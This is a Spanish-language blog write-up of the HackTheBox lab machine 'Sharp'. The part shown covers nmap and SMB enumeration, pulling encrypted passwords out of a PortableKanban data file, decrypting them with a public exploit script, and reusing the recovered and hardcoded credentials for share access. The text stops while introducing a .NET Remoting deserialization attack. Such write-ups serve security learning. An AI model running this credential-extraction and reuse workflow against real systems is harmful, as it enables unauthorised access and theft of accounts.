<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<link rel="icon" href="/assets/images/lanz2.png">

<title>HackTheBox - Sharp</title>

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Sharp | Sh0x blog</title>
<meta name="generator" content="Jekyll v3.8.6" />
<meta property="og:title" content="HackTheBox - Sharp" />
<meta name="author" content="lanz" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="M√°quina Windows nivel dif√≠cil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (ü§™) y jugaremos con binarios .exe para aprovechar deserializaciones y errores de configuraci√≥n." />
<meta property="og:description" content="M√°quina Windows nivel dif√≠cil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (ü§™) y jugaremos con binarios .exe para aprovechar deserializaciones y errores de configuraci√≥n." />
<link rel="canonical" href="http://localhost:4000/htb/sharp" />
<meta property="og:url" content="http://localhost:4000/htb/sharp" />
<meta property="og:site_name" content="Sh0x blog" />
<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303banner.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-05-01T00:00:00-07:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303banner.png" />
<meta property="twitter:title" content="HackTheBox - Sharp" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-05-01T00:00:00-07:00","datePublished":"2021-05-01T00:00:00-07:00","description":"M√°quina Windows nivel dif√≠cil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (ü§™) y jugaremos con binarios .exe para aprovechar deserializaciones y errores de configuraci√≥n.","headline":"HackTheBox - Sharp","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/sharp"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/sharp"}</script>
<!-- End Jekyll SEO tag -->

    
<link href="/assets/css/prism.css" rel="stylesheet">

<link href="/assets/css/theme.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>

</head>




<body>
	<!-- defer loading of font and font awesome -->
	<noscript id="deferred-styles">
		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
	</noscript>


<!-- Begin Sidebar Navigation
================================================== -->

<div class="sidebar">    
</div>   
<div class="nav-icon">
    <div class="hamburger-bar"></div>
</div>
<div id="blackover-nav" class="blackover"></div>
<nav id="menu">
    <ul>
        <h3>El tiempo a destiempo</h3>
        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
        <li><a href="/categories#article">Art√≠culos</a></li>
        <li><a href="/categories#htb">HackTheBox</a></li>
        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
    </ul>   
</nav>

<script src="/assets/js/lunr.js"></script>

<style>
    
</style>

<div class="wrap-search">
    <div class="d-flex align-items-center ml-auto">
        <i class="fas fa-search show-search"></i>
        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
        </form>
    </div>
</div>

<div id="lunrsearchresults">
    <ul></ul>
</div>

<script src="/assets/js/lunrsearchengine.js"></script>


<!-- End Sidebar Navigation
================================================== -->

<div class="site-content ">

<div class="container">

    <!-- Site Logo/Name
    ================================================== -->
   
    <a class="navbar-brand" href="/">
        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
    </a>  
   

    <!-- Site Tag
    ================================================== -->
    

    <!-- Content
    ================================================== -->
    <div class="main-content">
        <div class="entry-header">
    <!-- Post Title -->
    <h1 class="posttitle">HackTheBox - Sharp</h1>
    <!-- Author & Date  Box -->
    
    
    <div class="d-flex align-items-center mt-4">
        <div>
            
            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
            
        </div>            
        <div>
        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
        <span class="post-date"><time class="post-date" datetime="2021-05-01">01 May 2021</time></span>           
        
        </div>            
    </div>
    
</div>

<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->


<!-- Featured Image -->

<div class="entry-featured-image">
    
    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303banner.png" alt="HackTheBox - Sharp">
    
</div>


<!-- Content -->
<!-- Post, Page Content
================================================== -->
<div class="article-post">
    <!-- Toc if any -->
    
    <!-- End Toc -->
    <p>M√°quina Windows nivel dif√≠cil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (ü§™) y jugaremos con binarios <code>.exe</code> para aprovechar <strong>deserializaciones</strong> y errores de configuraci√≥n.</p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303sharpHTB.png" alt="303sharpHTB" /></p>

<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>

<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/9164">cube0x0</a>.</p>

<p>ADARLEEEEEEMECHAAAA!</p>

<p>De primeras jugando con el servicio <strong>SMB</strong> encontraremos la carpeta compartida <strong>kanban/</strong> algo sospechosa, entre sus archivos estar√° <code>PortableKanban.pk3</code> el cual dentro contiene encriptadas las contrase√±as de unos usuarios, usaremos un exploit para descifrarlas. Obtendremos la contrase√±a real de un usuario llamado <strong>lars</strong>, nos servir√° para autenticarnos al servicio <strong>SMB</strong>, pero en este caso tendremos la carpeta <strong>dev/</strong>, dentro tiene 2 binarios que jugando con <code>dnSpy</code> logramos decompilar, esto y bastante research nos servir√° para darnos cuenta de que estamos ante una deserializacion, usaremos <code>ysoserial</code> para generar payloads y aprovecharnos de la vulnerabilidad y as√≠ obtener una <strong>PowerShell</strong> como el usuario <strong>lars</strong>.</p>

<p>En el directorio <code>c:\Users\lars\Documents\wcf</code> tenemos unos archivos extra√±os que hacen alusi√≥n al modelo <strong>WCF</strong> (Windows Communication Foundation), jugaremos con <strong>SMB</strong> para transfer√≠rnoslos a nuestra m√°quina, nos daremos cuenta de que el propietario y el que ejecuta el servicio implicado es el usuario <strong>Administrator</strong>. Tendremos que modificar el contenido (aprovecharemos a <strong>Visual Studio</strong> para compilar los binarios) para que nos entable una Reverse Shell, finalmente subiremos los archivos compilados y obtendremos la dichosa Shell como el usuario <strong>Administrator</strong> en el sistema (:</p>

<h4 id="clasificaci√≥n-de-la-m√°quina">Clasificaci√≥n de la m√°quina</h4>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>

<p>Un poco de enumeraci√≥n, le gusta la realidad ;)</p>

<blockquote>
  <p>Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice.</p>
</blockquote>

<p>‚Ä¶</p>

<p>Tendremos como siempre 3 fases:</p>

<ol>
  <li><a href="#enumeracion">Enumeraci√≥n</a>.</li>
  <li><a href="#explotacion">Explotaci√≥n</a>.</li>
  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
</ol>

<p>‚Ä¶</p>

<h2 id="enumeracion">Enumeraci√≥n <a href="#enumeracion">#</a></h2>

<p>Empezaremos realizando un escaneo de puertos sobre la m√°quina para saber que servicios se est√°n ejecutando:</p>

<pre><code class="language-bash">‚Äì¬ª nmap -p- --open -v -Pn 10.10.10.219 -oG initScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Par√°metro</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td style="text-align: left">Escanea todos los 65535</td>
    </tr>
    <tr>
      <td>‚Äìopen</td>
      <td style="text-align: left">Solo los puertos que est√°n abiertos</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td style="text-align: left">Evita que realice Host Discovery, como <strong>ping</strong> (P) y el <strong>DNS</strong> (n)</td>
    </tr>
    <tr>
      <td>-v</td>
      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">funci√≥n</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">‚Äì¬ª cat initScan 
# Nmap 7.80 scan initiated Mon Jan 25 25:25:25 2021 as: nmap -p- --open -v -Pn -oG initScan 10.10.10.219
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.219 ()   Status: Up
Host: 10.10.10.219 ()   Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 8888/open/tcp//sun-answerbook///    Ignored State: filtered (65531)
# Nmap done at Mon Jan 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 372.21 seconds
</code></pre>

<p>Muy bien, tenemos los siguientes servicios:</p>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>135</td>
      <td style="text-align: left"><a href="https://www.extrahop.com/resources/protocols/msrpc/">MSRPC</a>: Permite enviar peticiones entre computadores sin necesidad de conocer/entender detalles de la red.</td>
    </tr>
    <tr>
      <td>139</td>
      <td style="text-align: left"><a href="https://es.wikipedia.org/wiki/NetBIOS">NetBIOS (SMB)</a>: Interfaz que permite enlazar sistemas operativos (servicios) de red con hardware.</td>
    </tr>
    <tr>
      <td>445</td>
      <td style="text-align: left"><a href="https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/">SMB</a>: Basicamente nos deja compartir archivos y directorios (otras cositas tambien) entre dispositivos de una red. (<a href="https://www.varonis.com/blog/smb-port/">Info sobre los puertos 139 y 445</a>)</td>
    </tr>
    <tr>
      <td>8888</td>
      <td style="text-align: left">Sun Answerbook: A√∫n no lo sabemos bien.</td>
    </tr>
  </tbody>
</table>

<p>Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio:</p>

<pre><code class="language-bash">‚Äì¬ª nmap -p 135,139,445,8888 -sC -sV -Pn 10.10.10.219 -oN portScan
</code></pre>

<table>
  <thead>
    <tr>
      <th>Par√°metro</th>
      <th style="text-align: left">Descripci√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p</td>
      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
    </tr>
    <tr>
      <td>-sC</td>
      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
    </tr>
    <tr>
      <td>-sV</td>
      <td style="text-align: left">Nos permite ver la versi√≥n del servicio</td>
    </tr>
    <tr>
      <td>-oN</td>
      <td style="text-align: left">Guarda el output en un archivo</td>
    </tr>
  </tbody>
</table>

<pre><code class="language-bash">‚Äì¬ª cat portScan 
# Nmap 7.80 scan initiated Mon Jan 25 25:25:25 2021 as: nmap -p 135,139,445,8888 -sC -sV -Pn -oN portScan 10.10.10.219
Nmap scan report for 10.10.10.219
Host is up (0.19s latency).

PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m09s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-25T16:17:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 25 25:25:25 2021 -- 1 IP address (1 host up) scanned in 112.21 seconds
</code></pre>

<p>Tenemos:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Puerto</th>
      <th style="text-align: center">Servicio</th>
      <th style="text-align: left">Versi√≥n</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">135</td>
      <td style="text-align: center">MsRPC</td>
      <td style="text-align: left">O.o</td>
    </tr>
    <tr>
      <td style="text-align: center">139</td>
      <td style="text-align: center">NetBIOS</td>
      <td style="text-align: left">u.u</td>
    </tr>
    <tr>
      <td style="text-align: center">445</td>
      <td style="text-align: center">SMB</td>
      <td style="text-align: left">e.e</td>
    </tr>
    <tr>
      <td style="text-align: center">8888</td>
      <td style="text-align: center"><a href="https://www.storagecraft.com/es">StorageCraft</a></td>
      <td style="text-align: left"><a href="https://www.storagecraft.com/es/productos/imagemanager">StorageCraft Image Manager</a></td>
    </tr>
  </tbody>
</table>

<p>Listo, demosle e investiguemos m√°s sobre cada servicio.</p>

<p>‚Ä¶</p>

<h3 id="puerto-445">Puerto 445 <a href="#puerto-445">‚åñ</a></h3>

<p>Con <a href="https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html">rpcclient</a> no logramos enumerar nada, tenemos acceso con credenciales nulas, pero no podemos ejecutar alguna acci√≥n (:</p>

<p>Mediante <code>crackmapexec</code> podemos ver que sistema operativo est√° siendo ejecutado:</p>

<pre><code class="language-bash">‚Äì¬ª crackmapexec smb 10.10.10.219 -u '' -p '' 
SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
SMB         10.10.10.219    445    SHARP            [-] Sharp\: STATUS_ACCESS_DENIED
</code></pre>

<p>Usando <a href="https://tools.kali.org/information-gathering/smbmap">smbmap</a> obtenemos informaci√≥n sobre los archivos o directorios compartidos en la red (<a href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">entre muchas m√°s cosas</a>).</p>

<pre><code class="language-bash">‚Äì¬ª smbmap -H 10.10.10.219
[+] IP: 10.10.10.219:445        Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
</code></pre>

<p>Opa, obtenemos 2 directorios interesantes, <code>dev</code> y <code>kanban</code>, pero solo tenemos acceso a uno de ellos, intentemos enumerarlo:</p>

<ul>
  <li>Connect list a shared folder - <a href="https://book.hacktricks.xyz/pentesting/pentesting-smb#connect-list-a-shared-folder">hacktricks.xyz</a>.</li>
</ul>

<pre><code class="language-bash">‚Äì¬ª smbclient //10.10.10.219/kanban --no-pass
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sat Nov 14 13:56:03 2020
  ..                                  D        0  Sat Nov 14 13:56:03 2020
  CommandLine.dll                     A    58368  Wed Feb 27 03:06:14 2013
  CsvHelper.dll                       A   141312  Wed Nov  8 08:52:18 2017
  DotNetZip.dll                       A   456704  Wed Jun 22 15:31:52 2016
  Files                               D        0  Sat Nov 14 13:57:59 2020
  Itenso.Rtf.Converter.Html.dll       A    23040  Thu Nov 23 11:29:32 2017
  Itenso.Rtf.Interpreter.dll          A    75776  Thu Nov 23 11:29:32 2017
  Itenso.Rtf.Parser.dll               A    32768  Thu Nov 23 11:29:32 2017
  Itenso.Sys.dll                      A    19968  Thu Nov 23 11:29:32 2017
  MsgReader.dll                       A   376832  Thu Nov 23 11:29:32 2017
  Ookii.Dialogs.dll                   A   133296  Thu Jul  3 16:20:12 2014
  pkb.zip                             A  2558011  Thu Nov 12 15:04:59 2020
  Plugins                             D        0  Thu Nov 12 15:05:11 2020
  PortableKanban.cfg                  A     5819  Sat Nov 14 13:56:01 2020
  PortableKanban.Data.dll             A   118184  Thu Jan  4 16:12:46 2018
  PortableKanban.exe                  A  1878440  Thu Jan  4 16:12:44 2018
  PortableKanban.Extensions.dll       A    31144  Thu Jan  4 16:12:50 2018
  PortableKanban.pk3                  A     2080  Sat Nov 14 13:56:01 2020
  PortableKanban.pk3.bak              A     2080  Sat Nov 14 13:55:54 2020
  PortableKanban.pk3.md5              A       34  Sat Nov 14 13:56:03 2020
  ServiceStack.Common.dll             A   413184  Wed Sep  6 06:18:22 2017
  ServiceStack.Interfaces.dll         A   137216  Wed Sep  6 06:17:30 2017
  ServiceStack.Redis.dll              A   292352  Wed Sep  6 06:02:24 2017
  ServiceStack.Text.dll               A   411648  Tue Sep  5 22:38:18 2017
  User Guide.pdf                      A  1050092  Thu Jan  4 16:14:28 2018

                10357247 blocks of size 4096. 7943298 blocks available
smb: \&gt; 
</code></pre>

<p>Tenemos varios archivos, pero estar enumerando de a uno en esa sesi√≥n no me gusta, podemos intentar dos cosas: hacernos una montura de ese directorio o descargarnos los archivos, vamos a descargarlos :P</p>

<p>Podemos usar <code>smbget</code> para esta tarea, aunque existen varias formas (:</p>

<pre><code class="language-bash">‚Äì¬ª smbget -R smb://10.10.10.219/kanban -U ''
Password for [] connecting to //kanban/10.10.10.219: 
Using workgroup WORKGROUP, guest user
smb://10.10.10.219/kanban/CommandLine.dll
smb://10.10.10.219/kanban/CsvHelper.dll
smb://10.10.10.219/kanban/DotNetZip.dll
smb://10.10.10.219/kanban/Itenso.Rtf.Converter.Html.dll
smb://10.10.10.219/kanban/Itenso.Rtf.Interpreter.dll
smb://10.10.10.219/kanban/Itenso.Rtf.Parser.dll
smb://10.10.10.219/kanban/Itenso.Sys.dll
smb://10.10.10.219/kanban/MsgReader.dll
smb://10.10.10.219/kanban/Ookii.Dialogs.dll
smb://10.10.10.219/kanban/pkb.zip
smb://10.10.10.219/kanban/Plugins/PluginsLibrary.dll
smb://10.10.10.219/kanban/PortableKanban.cfg
smb://10.10.10.219/kanban/PortableKanban.Data.dll
smb://10.10.10.219/kanban/PortableKanban.exe
smb://10.10.10.219/kanban/PortableKanban.Extensions.dll
smb://10.10.10.219/kanban/PortableKanban.pk3
smb://10.10.10.219/kanban/PortableKanban.pk3.bak
smb://10.10.10.219/kanban/PortableKanban.pk3.md5
smb://10.10.10.219/kanban/ServiceStack.Common.dll
smb://10.10.10.219/kanban/ServiceStack.Interfaces.dll
smb://10.10.10.219/kanban/ServiceStack.Redis.dll
smb://10.10.10.219/kanban/ServiceStack.Text.dll
smb://10.10.10.219/kanban/User Guide.pdf
Downloaded 7,90MB in 62 seconds
</code></pre>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303bash_smbget_files.png" alt="303bash_smbget_files" /></p>

<p>Listo, as√≠ nos queda m√°s f√°cil manipular los objetos, ahora, a enumerar y ver si hay algo interesante‚Ä¶</p>

<p>Si usamos la herramienta <code>strings</code> para ver cadenas de texto entendibles dentro de los binarios, hacia el objeto <code>PortableKanban.pk3</code> obtenemos esto:</p>

<pre><code class="language-bash">‚Äì¬ª strings PortableKanban.pk3
{"Columns":[{"Id":"4757781032fd41b2a4511822e2c08850","SortOrder":0,"Name":"Demo","Limit":0,"TaskOrder":{"SortType":"None","Parameters":[{"Field":"Completed","SortOrder":"Descending"},{"Field":"Deadline","SortOrder":"Ascending"},{"Field":"Priority","SortOrder":"Descending"},{"Field":"Topic","SortOrder":"Ascending"},{"Field":"Person","SortOrder":"Ascending"}]},"AutoComplete":false,"ResetCompleted":false,"TimeStamp":637409769443121006}],"Tasks":[{"Id":"33870d6dfe4146718ba0b2c9f7bc05cf","SeriesId":"00000000000000000000000000000000","SortOrder":"oGdBKcFw","ColumnId":"4757781032fd41b2a4511822e2c08850","TopicId":"00000000000000000000000000000000","PersonId":"00000000000000000000000000000000","Text":"New Task","Priority":"Low","Created":"\/Date(1605380100000+0100)\/","CreatedBy":"e8e29158d70d44b1a1ba4949d52790a0","Modified":"\/Date(-62135596800000)\/","ModifiedBy":"00000000000000000000000000000000","Deadline":"\/Date(1605308400000+0100)\/","HasDeadline":false,"Completed":"\/Date(1605308400000+0100)\/","CompletedBy":"00000000000000000000000000000000","Done":false,"Canceled":false,"Link":"","Subtasks":[],"Tags":[],"Estimate":0,"Progress":0,"Points":0,"Comments":[],"CustomFields":{},"TimeStamp":637409769542424146}],"TimeTracks":[],"Persons":[],"Topics":[],"Tags":[],"Views":[],"Users":[{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731},{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613}],"ServiceMessages":[],"CustomFieldDescriptors":[],"MetaData":{"Id":"ffffffffffffffffffffffffffffffff","SchemaVersion":"4.2.0.0","SchemaVersionModified":"\/Date(1605380100000+0100)\/","SchemaVersionModifiedBy":"e8e29158d70d44b1a1ba4949d52790a0","SchemaVersionChecked":"\/Date(-62135596800000-0000)\/","SchemaVersionCheckedBy":"00000000000000000000000000000000","TimeStamp":637409769001918463}}
</code></pre>

<p>Podemos apoyarnos de la herramienta <code>jq</code> para que nos lo pase a formato <code>json</code>:</p>

<pre><code class="language-bash">‚Äì¬ª strings PortableKanban.pk3 | jq
</code></pre>

<pre><code class="language-json">...
  ...
      "TimeStamp": 637409769542424200
    }
  ],
  "TimeTracks": [],
  "Persons": [],
  "Topics": [],
  "Tags": [],
  "Views": [],
  "Users": [
    {
      "Id": "e8e29158d70d44b1a1ba4949d52790a0",
      "Name": "Administrator",
      "Initials": "",
      "Email": "",
      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",
      "Role": "Admin",
      "Inactive": false,
      "TimeStamp": 637409769245503700
    },
    {
      "Id": "0628ae1de5234b81ae65c246dd2b4a21",
      "Name": "lars",
      "Initials": "",
      "Email": "",
      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",
      "Role": "User",
      "Inactive": false,
      "TimeStamp": 637409769265925600
    }
  ],
  "ServiceMessages": [],
  ...
  ...
  }
}
</code></pre>

<p>‚Ä¶</p>

<h2 id="explotacion">Explotaci√≥n <a href="#explotacion">#</a></h2>

<p>Al final vemos un apartado llamado <strong>usuarios</strong> en el que est√°n listados:</p>

<ul>
  <li><strong>Administrator</strong> : k+iUoOvQYG98PuhhRC7/rg==</li>
  <li><strong>lars</strong> : Ua3LyPFM175GN8D3+tqwLA==</li>
</ul>

<p>La encriptaci√≥n ta rara y buscando no encontramos nada sobre ella‚Ä¶ Pero despu√©s de un tiempo estancado sin buscar lo realmente necesario, encontr√© un exploit muy reciente (por lo tanto tuve mucha suerte) que extrae las contrase√±as y las desencripta:</p>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a>.</li>
</ul>

<p>Lo ejecutamos simplemente pas√°ndole el archivo <code>PortableKanban.pk3</code>:</p>

<pre><code class="language-bash">‚Äì¬ª python3 portable_kanban_encrypted.py PortableKanban.pk3
Administrator:G2@$btRSHJYTarg
lars:G123HHrth234gRG
</code></pre>

<p>Lindo lindo, obtenemos al menos algo diferente a lo anterior. Si validamos de nuevo con <code>smbmap</code> tenemos:</p>

<pre><code class="language-bash">‚Äì¬ª smbmap -H 10.10.10.219 -u 'lars' -p 'G123HHrth234gRG'
[+] IP: 10.10.10.219:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS
</code></pre>

<p>Nice son v√°lidas y tenemos acceso a uno de los directorios interesantes: <code>dev</code>, las credenciales del usuario <code>Administrator</code> no funcionan :P</p>

<p>Me puse a buscar como hubiera sido la desencriptaci√≥n sin el exploit reciente, pero no encontr√© alg√∫n camino. Me quedo con la duda, al finalizar indagar√© m√°s (: sigamos.</p>

<p>Enumeramos con <code>smbclient</code> sobre el nuevo recurso:</p>

<pre><code class="language-bash">‚Äì¬ª smbclient //10.10.10.219/dev -U 'lars' 
Enter WORKGROUP\lars's password: 
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Sun Nov 15 06:30:13 2020
  ..                                  D        0  Sun Nov 15 06:30:13 2020
  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020
  notes.txt                           A       70  Sun Nov 15 08:59:02 2020
  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020
  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020

                10357247 blocks of size 4096. 7941868 blocks available
smb: \&gt; 
</code></pre>

<p>Y procedemos tambien a descargarlos:</p>

<pre><code class="language-bash">‚Äì¬ª smbget -R smb://10.10.10.219/dev -U 'lars'
Password for [lars] connecting to //dev/10.10.10.219: 
Using workgroup WORKGROUP, user lars
smb://10.10.10.219/dev/Client.exe
smb://10.10.10.219/dev/notes.txt
smb://10.10.10.219/dev/RemotingLibrary.dll
smb://10.10.10.219/dev/Server.exe
Downloaded 15,57kB in 18 seconds
</code></pre>

<p>Tengo un problema con <code>wine</code> (que nos permite ejecutar programas basados en <code>Windows</code> sobre <code>Linux</code>), as√≠ que usaremos una m√°quina virtual con <code>Windows</code> para jugar con los binarios.</p>

<p>Buscando por internet: <code>remoting library exploit</code>, encontramos un gran art√≠culo que aborda mucho sobre el tema, adem√°s nos habla de <code>dnSpy</code>, un debugger y decompilador de binarios <code>.exe</code>.</p>

<ul>
  <li><a href="https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/">Incre√≠ble articulo sobre <strong>.Net Remoting for Hackers</strong></a>.</li>
  <li><a href="https://www.c-sharpcorner.com/article/net-remoting-in-a-simple-way/">Info sobre <strong>.Net Remoting</strong></a>.</li>
</ul>

<p>Si abrimos los archivos, tenemos:</p>

<p><strong>¬¨ Server.exe:</strong></p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_dnSpy_serverEXE.png" alt="303win_dnSpy_serverEXE" /></p>

<ul>
  <li>La conexi√≥n se generar√° sobre el puerto <code>8888</code>.</li>
  <li>Crea un canal de comunicaci√≥n (servicio), configurando el nombre de la aplicaci√≥n como: <code>SecretSharpDebugApplicationEndpoint</code>.</li>
  <li>Mientras se tenga la conexi√≥n establecida, se mostrara <code>Registered service</code>.</li>
</ul>

<p><strong>¬¨ Client.exe:</strong></p>

<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303win_dnSpy_clientEXE.png" alt="303win_dnSpy_clientEXE" /></p>

<ul>
  <li>Abre una petici√≥n hacia: <code>tcp://localhost:8888/SecretSharpDebugApplicationEndpoint</code>.
    <ul>
      <li>(Entonces sabemos que el puerto <code>8888</code> de la m√°quina se vuelve importante)</li>
    </ul>
  </li>
  <li>Se autentica con: <code>debug:SharpApplicationDebugUserPassword123!</code>.</li>
</ul>

<p>Ejecutemos los programas:</p>

<pre><code class="language-powershell">C:\htb_sharp\files&gt;Server.exe
Registered service
</code></pre>

<pre><code class="language-powershell">C:\htb_sharp\files&gt;netstat -a

Conexiones activas

  Proto  Direcci√≥n local        Direcci√≥n remota       Estado
  ...
  TCP    0.0.0.0:8888           WIN:0                  LISTENING
  ...
</code></pre>

<p>Sip, tal como esper√°bamos.</p>

<pre><code class="language-powershell">C:\htb_sharp\files&gt;Client.exe

C:\htb_sharp\files&gt;
</code></pre>

<p>No obtenemos nada, pero asumimos que hizo la conexi√≥n y pues termino :P</p>

<p>‚Ä¶</p>

<p>Pues empecemos a ver como podemos explotar esta locura‚Ä¶</p>

<p>(Entender el tiempo es tiempo perdido u.u)</p>

<p>Despu√©s de un rato, encontramos un repositorio que se aprovecha de estos servicios y nos permite entre muchas cosas, aprovecharnos de la siempre peligrosa deserializaci√≥n insegura‚Ä¶</p>

<ul>
  <li><a href="https://github.com/tyranid/ExploitRemotingService">github.com/tyranid/ExploitRemotingService</a>.</li>
  <li><a href="https://www.tiraniddo.dev/2014/11/stupid-is-as-stupid-does-when-it-comes.html">Articulo de <strong>tyranid</strong> sobre el uso del exploit</a>.</li>
  <li><a href="https://www.acunetix.com/vulnerabilities/web/net-http-remoting-publicly-exposed/">Encontramos la descripci√≥n de la vulnerabilidad - .NET HTTP Remoting public exposed</a>.</li>
</ul>

<blockquote>
  <p>The technology depends on SoapFormater serialization mechanism which is vulnerable to deserialization attack by default. <a href="https://www.acunetix.com/vulnerabilities/web/net-http-remoting-publicly-exposed/">Acunetix</a></p>
</blockquote>

<p>Info r√°pida sobre deserializaci√≥n:</p>

<ul>
  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">What is <strong>deserialization?</strong></a>.</li>
